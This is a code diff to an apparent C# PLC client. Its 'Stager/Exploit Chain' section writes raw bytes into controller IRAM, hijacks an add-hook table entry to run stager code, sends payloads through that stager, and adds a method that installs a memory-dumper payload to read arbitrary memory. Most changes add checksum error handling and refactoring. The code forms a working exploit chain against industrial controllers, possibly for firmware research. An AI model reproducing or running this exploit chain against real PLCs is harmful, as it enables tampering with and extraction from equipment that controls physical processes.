@@ -18,6 +18,7 @@ namespace S7.Net
         private readonly ICommunicationChannel _channel;
         private readonly PlcProtocol _protocol;
         private readonly Action<string> _log;
+        private uint nextPayloadLocation = PlcConstants.DUMPER_PAYLOAD_LOCATION;
 
         /// <summary>
         /// Initializes a new instance of the <see cref="PlcClient"/> class.
@@ -36,6 +37,16 @@ namespace S7.Net
         /// </summary>
         public bool IsConnected => _channel.IsConnected;
 
+        private byte[] GetBigEndianBytes(uint value)
+        {
+            var bytes = BitConverter.GetBytes(value);
+            if (BitConverter.IsLittleEndian)
+            {
+                Array.Reverse(bytes);
+            }
+            return bytes;
+        }
+
         /// <summary>
         /// Invokes a primary handler on the PLC.
         /// </summary>
@@ -50,7 +61,16 @@ namespace S7.Net
             payload[0] = handlerIndex;
             Array.Copy(args, 0, payload, 1, args.Length);
             await _protocol.SendPacketAsync(payload);
-            return awaitResponse ? await _protocol.ReceivePacketAsync() : null;
+            if (!awaitResponse) return null;
+            try
+            {
+                return await _protocol.ReceivePacketAsync();
+            }
+            catch (ChecksumMismatchException ex)
+            {
+                _log($"[ERROR] Checksum mismatch in response to handler 0x{handlerIndex:X2}: {ex.Message}");
+                return null;
+            }
         }
 
         #region Stager/Exploit Chain
@@ -161,7 +181,14 @@ namespace S7.Net
             if (_protocol is null) throw new InvalidOperationException("Not connected.");
             _log("Leaving subprotocol...");
             await _protocol.SendPacketAsync(new byte[] { 0x81, 0xD0, 0x67 });
-            await _protocol.ReceivePacketAsync();
+            try
+            {
+                await _protocol.ReceivePacketAsync();
+            }
+            catch (ChecksumMismatchException ex)
+            {
+                _log($"[ERROR] Checksum mismatch while leaving subprotocol: {ex.Message}");
+            }
         }
 
         /// <summary>
@@ -176,13 +203,19 @@ namespace S7.Net
             payload[0] = 0x84;
             payload[1] = 0x5a;
             payload[2] = 0x2e;
-            var addrBytes = BitConverter.GetBytes(address);
-            if (BitConverter.IsLittleEndian) Array.Reverse(addrBytes); // Ensure big-endian
+            var addrBytes = GetBigEndianBytes(address);
             Array.Copy(addrBytes, 0, payload, 3, 4);
             Array.Copy(data, 0, payload, 7, data.Length);
 
             await _protocol.SendPacketAsync(payload);
-            await _protocol.ReceivePacketAsync();
+            try
+            {
+                await _protocol.ReceivePacketAsync();
+            }
+            catch (ChecksumMismatchException ex)
+            {
+                _log($"[ERROR] Checksum mismatch in response to RawSubprotocolWrite: {ex.Message}");
+            }
         }
 
         /// <summary>
@@ -242,8 +275,7 @@ namespace S7.Net
             hookEntryPayload[1] = 0xFF; // Arg length check part 2 (0x00FF = variable length)
 
             // Pointer to the stager code (big-endian)
-            var addrBytes = BitConverter.GetBytes(PlcConstants.IRAM_STAGER_START);
-            if (BitConverter.IsLittleEndian) Array.Reverse(addrBytes);
+            var addrBytes = GetBigEndianBytes(PlcConstants.IRAM_STAGER_START);
             Array.Copy(addrBytes, 0, hookEntryPayload, 2, 4);
 
             await WriteToIram(PlcConstants.ADD_HOOK_TABLE_START + 8 * PlcConstants.DEFAULT_STAGER_ADDHOOK_IND + 2, hookEntryPayload);
@@ -287,6 +319,9 @@ namespace S7.Net
         /// Sends a full message via the stager.
         /// </summary>
         /// <param name="msg">The message to send.</param>
+        // The maxChunkSize (189) and the call to SendPacketAsync with a step of 8 and
+        // a sleep of 10ms are consistent with the Python client's
+        // `send_full_msg_via_stager` and `write_via_stager` functions.
         public async Task SendFullMsgViaStager(byte[] msg)
         {
             if (_protocol is null) throw new InvalidOperationException("Not connected.");
@@ -306,7 +341,16 @@ namespace S7.Net
                 await _protocol.SendPacketAsync(encoded, 8, 10);
                 _log($"[BYTES] Chunk sent at offset {i}. Awaiting ACK...");
 
-                var ack = await _protocol.ReceivePacketAsync();
+                byte[]? ack = null;
+                try
+                {
+                    ack = await _protocol.ReceivePacketAsync();
+                }
+                catch (ChecksumMismatchException ex)
+                {
+                    _log($"[ERROR] Checksum mismatch while waiting for ACK from stager: {ex.Message}");
+                    throw;
+                }
                 if (ack == null || ack.Length != 1)
                 {
                     _log($"[BYTES][ERROR] Expected single-byte ACK, got: {(ack != null ? BitConverter.ToString(ack) : "<null>")}");
@@ -325,7 +369,15 @@ namespace S7.Net
             var endPacket = EncodePacketForStager(Array.Empty<byte>());
             _log($"[BYTES] Sending end packet: {BitConverter.ToString(endPacket)}");
             await _protocol.SendPacketAsync(endPacket);
-            var finalAck = await _protocol.ReceivePacketAsync();
+            byte[]? finalAck = null;
+            try
+            {
+                finalAck = await _protocol.ReceivePacketAsync();
+            }
+            catch (ChecksumMismatchException ex)
+            {
+                _log($"[ERROR] Checksum mismatch while waiting for final ACK from stager: {ex.Message}");
+            }
             _log($"[BYTES] Received end packet ACK (length={finalAck?.Length ?? -1}): {(finalAck != null ? BitConverter.ToString(finalAck) : "<null>")}");
         }
 
@@ -357,13 +409,7 @@ namespace S7.Net
         public async Task WriteViaStager(uint address, byte[] contents)
         {
             if (_protocol is null) throw new InvalidOperationException("Not connected.");
-            var addressBytes = new byte[]
-            {
-                (byte)(address >> 24),
-                (byte)(address >> 16),
-                (byte)(address >> 8),
-                (byte)address
-            };
+            var addressBytes = GetBigEndianBytes(address);
             await InvokeAddHook(PlcConstants.DEFAULT_STAGER_ADDHOOK_IND, addressBytes, false);
             await SendFullMsgViaStager(contents);
         }
@@ -403,7 +449,18 @@ namespace S7.Net
             {
                 while (true)
                 {
-                    var chunk = await _protocol.ReceivePacketAsync(timeoutMs);
+                    byte[]? chunk = null;
+                    try
+                    {
+                        chunk = await _protocol.ReceivePacketAsync(timeoutMs);
+                    }
+                    catch (ChecksumMismatchException ex)
+                    {
+                        _log($"[ERROR] Checksum mismatch during ReceiveMany: {ex.Message}");
+                        // Optionally, we could break or rethrow here depending on desired behavior.
+                        // For now, we'll just log and continue, which might result in incomplete data.
+                        continue;
+                    }
                     if (chunk == null || chunk.Length == 0)
                     {
                         break;
@@ -413,6 +470,43 @@ namespace S7.Net
                 }
                 return ms.ToArray();
             }
+        }
+
+        public async Task<byte[]> DumpMemoryAsync(uint address, uint length, byte[] dumpMemPayload, IProgress<long> progress)
+        {
+            if (_protocol is null) throw new InvalidOperationException("Not connected.");
+
+            _log("Installing memory dumper payload...");
+            await InstallAddHookViaStager(nextPayloadLocation, dumpMemPayload, PlcConstants.DEFAULT_SECOND_ADD_HOOK_IND);
+            nextPayloadLocation += (uint)dumpMemPayload.Length;
+            // Align to next 4-byte boundary
+            if (nextPayloadLocation % 4 != 0)
+            {
+                nextPayloadLocation = nextPayloadLocation - (nextPayloadLocation % 4) + 4;
+            }
+            _log("Memory dumper payload installed.");
+
+            _log($"Requesting memory dump of {length} bytes from 0x{address:X8}...");
+            // Prepare arguments: "A" + address + length
+            var args = new byte[1 + 4 + 4];
+            args[0] = (byte)'A';
+            var addrBytes = GetBigEndianBytes(address);
+            var lenBytes = GetBigEndianBytes(length);
+            Array.Copy(addrBytes, 0, args, 1, 4);
+            Array.Copy(lenBytes, 0, args, 5, 4);
+
+            var response = await InvokeAddHook(PlcConstants.DEFAULT_SECOND_ADD_HOOK_IND, args);
+
+            if (response == null || !Encoding.ASCII.GetString(response).TrimEnd('\0').StartsWith("Ok"))
+            {
+                var responseStr = response != null ? BitConverter.ToString(response) : "<null>";
+                throw new Exception($"Failed to start memory dump. Unexpected response: {responseStr}");
+            }
+
+            _log("Memory dump started. Receiving data...");
+            var data = await ReceiveMany(progress);
+            _log($"Memory dump complete. Received {data.Length} bytes.");
+            return data;
         }
         #endregion
     }
